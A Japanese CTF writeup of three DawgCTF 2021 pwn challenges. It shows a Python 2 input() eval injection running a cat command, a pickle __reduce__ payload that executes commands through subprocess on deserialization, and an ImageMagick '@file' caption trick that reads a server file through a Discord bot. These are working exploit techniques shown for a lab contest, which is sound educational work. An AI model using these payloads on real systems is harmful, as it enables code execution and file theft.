# DawgCTF 2021 Writeup

## 目次

- Pwn
  - [No Step On Snek](#No-Step-On-Snek)
  - [Jellyspotters](#Jellyspotters)
  - [MDL Considered Harmful](#MDL-Considered-Harmful)

## No Step On Snek

### 問題

**75 points**  
I heard you guys like python pwnables  
`nc umbccd.io 4000`  
Author: trashcanna  

### 解説

ncコマンドで接続すると以下のように表示されます。

```
Welcome to the aMAZEing Maze
Your goal is to get from one side of the board to the other.
Your character is represented by "OO" and the finish will be "FF"
W/w - Move up!
A/a - Move left!
S/s - Move down!
D/d - Move right!
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|OO         |        |     |        |           |
+  +--+  +  +--+  +  +  +  +--+  +  +--+--+  +  +
|  |  |  |     |  |  |  |  |     |  |        |  |
+  +  +  +--+  +  +--+  +  +  +--+  +  +--+--+  +
|  |  |  |     |     |  |     |  |  |     |     |
+  +  +  +  +--+--+  +--+--+--+  +  +  +  +  +--+
|     |  |        |        |        |  |  |     |
+--+  +  +--+--+  +  +--+--+  +--+--+  +  +--+--+
|     |  |           |     |  |     |  |  |     |
+--+--+  +--+--+--+  +  +  +  +  +  +  +  +  +  +
|        |        |  |  |     |  |     |     |  |
+  +--+--+  +--+  +  +  +--+--+--+  +--+--+--+  +
|  |        |     |  |           |     |        |
+  +  +--+--+  +--+--+--+--+--+  +--+  +  +--+--+
|  |     |  |                 |  |     |        |
+  +--+  +  +--+--+--+--+--+  +  +  +--+--+--+  +
|     |  |              |     |  |  |        |  |
+  +  +  +  +--+--+--+  +  +--+  +  +  +--+  +  +
|  |  |     |           |  |     |     |     |  |
+  +  +--+--+  +--+--+--+  +  +--+--+--+  +--+  +
|  |  |        |        |  |        |  |  |     |
+  +--+  +--+--+  +--+  +  +--+--+  +  +  +  +  +
|  |     |        |     |           |     |  |  |
+  +  +--+--+--+--+  +--+--+--+--+--+  +--+  +  +
|     |     |     |           |  |     |  |  |  |
+  +--+  +  +  +  +--+  +--+  +  +  +--+  +  +  +
|  |     |     |     |  |     |           |  |  |
+  +  +--+--+--+--+  +  +  +--+  +--+--+--+  +  +
|     |           |     |  |     |        |  |  |
+--+--+  +--+--+  +--+--+  +--+--+  +--+  +  +  +
|              |                    |        |FF|
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+


Make your move:
```

まずW, A, S, D以外の文字、例えばZを入れてみると以下のように出力されました。

```
Make your move: Z
Traceback (most recent call last):
  File "/home/challuser/nosteponsnek.py", line 73, in <module>
    __main__()
  File "/home/challuser/nosteponsnek.py", line 69, in __main__
    still_playing = make_move(maze)
  File "/home/challuser/nosteponsnek.py", line 27, in make_move
    move = input("Make your move: ")
  File "<string>", line 1, in <module>
NameError: name 'Z' is not defined
```

見るからにPythonなのですが、`NameError: name 'Z' is not defined`とあるため入力がそのままコードとして解釈されています。これはPython2系の仕様であり、input()は受け取った文字列をeval()のように式としてそのまま解釈します。  
いろいろ試すと、`make_move(1)`や`make_move("a")`などで引数に渡した値がそのまま返ってくることに気付きます。あとは大体何でもできるのですが、エラー文でファイルのパスが分かっているのでまずこのファイルの中身を見るために`make_move(open("/home/challuser/nosteponsnek.py").read())`をしてみます。

```py
#!/usr/bin/env python2.7

from random import shuffle, randrange
import os

W = 1
w = 1
A = -9
a = -9
S = -1
s = -1
D = 9
d = 9
valid_moves = [W, w, A, a, S, s, D, d]

def welcome():
        print "Welcome to the aMAZEing Maze"
        print "Your goal is to get from one side of the board to the other."
        print "Your character is represented by \"OO\" and the finish will be \"FF\""
        print "W/w - Move up!"
        print "A/a - Move left!"
        print "S/s - Move down!"
        print "D/d - Move right!"

def make_move(maze):
        print maze
        move = input("Make your move: ")
        if move not in valid_moves:
                raise NameError
        # TODO: Move the player around the board
        # Was a little cruched for time this year so I didn't feel like writing
        # the gameplay. I hope that's okay :/
        return True

def replace_last(s, replace_what, replace_with):
        head, _sep, tail = s.rpartition(replace_what)
        return head + replace_with + tail

# Randomly generate the gameboard and insert start/finish
def make_maze(w = 16, h = 16):
        vis = [[0] * w + [1] for _ in range(h)] + [[1] * (w + 1)]
        ver = [["|  "] * w + ['|'] for _ in range(h)] + [[]]
        hor = [["+--"] * w + ['+'] for _ in range(h + 1)]

        def walk(x, y):
                vis[y][x] = 1
                d = [(x - 1, y), (x, y + 1), (x + 1, y), (x, y - 1)]
                shuffle(d)
                for (xx, yy) in d:
                        if vis[yy][xx]: continue
                        if xx == x: hor[max(y, yy)][x] = "+  "
                        if yy == y: ver[y][max(x, xx)] = "   "
                        walk(xx, yy)

        walk(randrange(w), randrange(h))

        s = ""
        for (a, b) in zip(hor, ver):
                s += ''.join(a + ['\n'] + b + ['\n'])
        s = s.replace(" ", "O", 2)
        s = replace_last(s, "  ", "FF")
        return s

def __main__():
        welcome()
        still_playing = True
        maze = make_maze()
        while(still_playing):
                still_playing = make_move(maze)
        print "Congrats! You've finished the maze! Here's your flag:"
        os.system("/bin/cat flag.txt")

__main__()
```

`__main__()`関数を見ると`os.system("/bin/cat flag.txt")`とあるので、そのまま`make_move(os.system("/bin/cat flag.txt"))`を渡すとフラグが得られます。

## Jellyspotters

### 問題

**100 points**  
The leader of the Jellyspotters has hired you to paint them a poster for their convention, using this painting program. Also, the flag is in ~/flag.txt.

nc umbccd.io 4200

Author: nb

### 解説

ncコマンドで接続すると描画プログラムのシェルのようなものがあります。helpを確認して少し操作してみると以下のようになります。

```
Welcome to the Paint Program!
Paint us a new poster for the Jellyspotters 2021 convention. Make Kevin proud.
Type 'help' for help.
> help
Listing commands...
display             Display the canvas
clearall            Clear the canvas
set [row] [col]     Set a particular pixel
clear [row] [col]   Clear a particular pixel
export              Export the canvas state
import [canvas]     Import a previous canvas
exit                Quit the program
> display
##################
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
##################
> set 5 5
##################
#                #
#                #
#                #
#                #
#                #
#     0          #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
##################
```

exportとimportは以下のような使い方ができます。表示形式はBase64のようですが、デコードしてもそのまま読めるような形にはなりませんでした。

```
> export
Exported canvas string:
gASVSQIAAAAAAABdlChdlCiMASCUaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAKMATCUaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlZS4=
> import gASVSQIAAAAAAABdlChdlCiMASCUaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAKMATCUaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlZS4=
Importing...
Done!
##################
#                #
#                #
#                #
#                #
#                #
#     0          #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
#                #
##################
>
```

何かヒントが欲しいのでimportでエラーを吐きそうな適当な引数を渡します。

```
> import a
Importing...
Traceback (most recent call last):
  File "/home/challuser/jellyspotters.py", line 67, in <module>
    imp = pickle.loads(base64.b64decode(split[1]))
  File "/usr/lib/python3.8/base64.py", line 87, in b64decode
    return binascii.a2b_base64(s)
binascii.Error: Invalid base64-encoded string: number of data characters (1) cannot be 1 more than a multiple of 4
```

Pythonでpickleを使ってPythonオブジェクトを変換しBase64エンコードをしているみたいなので、ローカルで同じことをすればPythonオブジェクトに復元したり、好きなPythonオブジェクトをimportで渡したりできそうです。  
復元してみると二次元リストだということが分かるので、以下のコードで適当なデータでBase64文字列を作り、渡してみます。

```py
import pickle
import base64

data = [
    ["a", "b", "c"],
    ["d", "e", "f"],
]
p = pickle.dumps(data)
print(base64.b64encode(p))
```

出力

```
b'gASVJQAAAAAAAABdlChdlCiMAWGUjAFilIwBY5RlXZQojAFklIwBZZSMAWaUZWUu'
```

importに渡してみるとこうなります。

```
> import gASVJQAAAAAAAABdlChdlCiMAWGUjAFilIwBY5RlXZQojAFklIwBZZSMAWaUZWUu
Importing...
Done!
##################
#abc#
#def#
##################
>
```

どうにかして内部のファイルを出力するような関数を実行させたいところですが、静的なオブジェクトしか渡せないのでどうすればよいか考えました。考えても思いつかなかったので「pickle vulnerability」とかで検索すると任意コード実行の脆弱性(参考: https://blog.nelhage.com/2011/03/exploiting-pickle/)がありました。  
これを利用して以下のコードを書いて出力をimportに渡せばフラグが得られます。

```py
import pickle
import base64
import subprocess

class RunShell(object):
    def __reduce__(self):
        return (subprocess.Popen, (('cat', 'flag.txt'),))

r = RunShell()
p = pickle.dumps(r)
print(base64.b64encode(p))
```

## MDL Considered Harmful

### 問題

**225 points**  
There's a bot named MDLChef in the Discord. You need to DM it, it doesn't respond in the server. On its host machine, there's a file at /opt/flag.txt - it contains the flag. Go get it.

Note: This is NOT an OSINT challenge. The source code really isn't available. Good luck.

Author: nb

### 解説

DawgCTFのDiscordサーバーにMDLChefというBotがいて、「DM me and say /help」とのことなのでDMに/helpを送ります。  

以下の返信が来ます。

> **MDLChef Bot**  
This bot generates memes using MDL, the Meme Description Language.  
Here is an example of a valid MDL sample:  

```json
{
    version: "MDL/1.1",
    type: "meme",
    base: {
        format: "Meme.Matrix.WhatIfIToldYou"
    },
    caption: {
        topText: "what if i told you",
        bottomText: "you can code your memes"
    }
}
```

> Just send a valid MDL snippet in the DM and the bot will automatically recognize it and respond.  

提示されたMDL sampleを送信してみるとミーム画像が返されました。  
/helpはスラッシュコマンドだったので、/を打って候補に出る他のコマンドも試してみます。  
/creditsを送信すると以下の返信が来ます。

>__Credits__  
Thank you to...  
\- The Rust programming language  
\- The Serenity Discord library  
\- The ImageMagick caption command for meme generation  
Note: The source code for this bot is NOT publicly available, due to the CyberDawgs' extreme anti-open-source and pro-proprietary stance. We don't NEED public auditing. All of the code in this bot is totally and completely secure.
  
Rust、Serenity Discordライブラリ、ImageMagickのcaptionコマンドを使っているということなので、それぞれで内部ファイルを読み込んで表示できそうな脆弱性がないか検索してみると、「imagemagick caption from file」で検索してImageMagickのcaptionコマンドでファイルから読み込んでテキストを画像に書き込める機能(参考: https://legacy.imagemagick.org/discourse-server/viewtopic.php?t=31322)が見つかりました。

以下のMDLを送るとフラグが手に入ります。

```json
{
    version: "MDL/1.1",
    type: "meme",
    base: {
        format: "Meme.DrakeYesNo"
    },
    caption: {
        topText: "@/opt/flag.txt",
        bottomText: "/opt/flag.txt",
    },
}
```